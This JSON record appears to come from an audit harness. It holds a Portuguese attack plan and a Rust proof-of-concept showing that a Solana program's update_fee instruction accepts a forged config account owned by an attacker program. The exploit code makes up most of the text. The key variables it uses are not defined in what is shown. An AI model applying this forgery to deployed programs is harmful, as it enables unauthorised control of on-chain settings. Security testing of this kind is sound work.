{
  "plan": "O atacante cria uma conta forjada cujo owner é um programa malicioso (env.attacker_program), com os primeiros 8 bytes iguais ao ADMIN_CONFIG_DISCRIMINATOR e a pubkey do atacante nos bytes 8..40. O baseline usa uma conta config legítima (owner = env.program_id) com o mesmo discriminador e a pubkey do atacante como admin, provando que a instrução update_fee funciona. O ataque repete a mesma chamada, mas substitui a conta config legítima pela conta forjada, mantendo o atacante como authority signer. O efeito mede se o new_fee foi gravado na conta forjada (offset 40..48), demonstrando que o programa aceitou uma conta com owner diferente do esperado.",
  "scenario": "let attacker = Pubkey::new_unique();
let new_fee: u64 = 999_999;

// Conta config forjada: owner = programa do atacante, discriminador correto, admin = atacante
let mut forged_data = Vec::new();
forged_data.extend_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);
forged_data.extend_from_slice(attacker.as_ref());
forged_data.extend_from_slice(&0u64.to_le_bytes());
let forged_config = account(&env.attacker_program.unwrap(), &forged_data, None);

// Conta config legítima: owner = programa alvo, mesmo layout
let mut legit_data = Vec::new();
legit_data.extend_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);
legit_data.extend_from_slice(attacker.as_ref());
legit_data.extend_from_slice(&0u64.to_le_bytes());
let legit_config = account(&env.program_id, &legit_data, None);

let authority_account = wallet(1_000_000_000);

// Dados da instrução: IX_UPDATE_FEE (1) + new_fee (u64 LE)
let mut ix_data = Vec::new();
ix_data.push(1u8);
ix_data.extend_from_slice(&new_fee.to_le_bytes());

// Baseline: usa a conta config legítima
let baseline_ix = env.raw_ix(
    &ix_data,
    &[
        AccountMeta::new(legit_config_key, false),
        AccountMeta::new_readonly(attacker, true),
    ],
);
let baseline_accounts = vec![
    (legit_config_key, legit_config),
    (attacker, authority_account.clone()),
];
let baseline_result = env.baseline("update_fee com config legítima", &baseline_ix, &baseline_accounts);

// Ataque: substitui a conta config pela forjada (owner = attacker_program)
let attack_ix = env.raw_ix(
    &ix_data,
    &[
        AccountMeta::new(forged_config_key, false),
        AccountMeta::new_readonly(attacker, true),
    ],
);
let attack_accounts = vec![
    (forged_config_key, forged_config),
    (attacker, authority_account),
];
let attack_result = env.attack("update_fee com config forjada (owner malicioso)", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let forged_after = after(&attack_result, &forged_config_key);
    env.effect(
        "new_fee gravado na conta forjada com owner malicioso",
        read_u64(forged_after.data(), 40) == new_fee,
    );
}"
}

